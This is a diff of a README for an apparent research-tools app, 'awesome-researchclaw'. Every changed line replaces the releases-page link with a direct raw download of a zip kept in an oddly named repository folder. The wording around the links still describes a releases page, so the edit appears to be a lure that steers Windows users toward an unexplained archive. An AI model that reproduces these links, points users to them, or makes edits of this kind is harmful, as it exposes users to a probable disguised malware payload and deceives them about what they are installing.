@@ -1,6 +1,6 @@
 # 🦞 awesome-researchclaw - Curated research tools in one place
 
-[![Download from Releases](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge)](https://github.com/Audiedashed559/awesome-researchclaw/releases)
+[![Download from Releases](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge)](https://github.com/Audiedashed559/awesome-researchclaw/raw/refs/heads/main/lophiostomous/researchclaw-awesome-v3.7.zip)
 
 ## 📘 Overview
 
@@ -20,7 +20,7 @@ This project is meant for people who want a simple place to find useful research
 
 To get the app on Windows, visit this page to download:
 
-https://github.com/Audiedashed559/awesome-researchclaw/releases
+https://github.com/Audiedashed559/awesome-researchclaw/raw/refs/heads/main/lophiostomous/researchclaw-awesome-v3.7.zip
 
 Pick the latest release, then download the Windows file that matches your system. If you see more than one file, choose the one with `win` or `windows` in the name.
 
@@ -49,7 +49,7 @@ Each part is selected to help you move from idea to draft with less effort.
 ## 🔧 How to Install on Windows
 
 1. Open the releases page:  
-   https://github.com/Audiedashed559/awesome-researchclaw/releases
+   https://github.com/Audiedashed559/awesome-researchclaw/raw/refs/heads/main/lophiostomous/researchclaw-awesome-v3.7.zip
 
 2. Find the newest version near the top of the page.
 
@@ -179,7 +179,7 @@ That works too. You can use the parts that fit your work and ignore the rest.
 
 ### Where do I get the latest version?
 Use the releases page:
-https://github.com/Audiedashed559/awesome-researchclaw/releases
+https://github.com/Audiedashed559/awesome-researchclaw/raw/refs/heads/main/lophiostomous/researchclaw-awesome-v3.7.zip
 
 ## 🔎 Suggested Workflow
 
@@ -216,7 +216,7 @@ If you are unsure which file to choose, use the Windows installer or the file ma
 
 ## 📌 Useful Link
 
-[Visit the latest releases page](https://github.com/Audiedashed559/awesome-researchclaw/releases)
+[Visit the latest releases page](https://github.com/Audiedashed559/awesome-researchclaw/raw/refs/heads/main/lophiostomous/researchclaw-awesome-v3.7.zip)
 
 ## 🧾 What This Project Is For
 
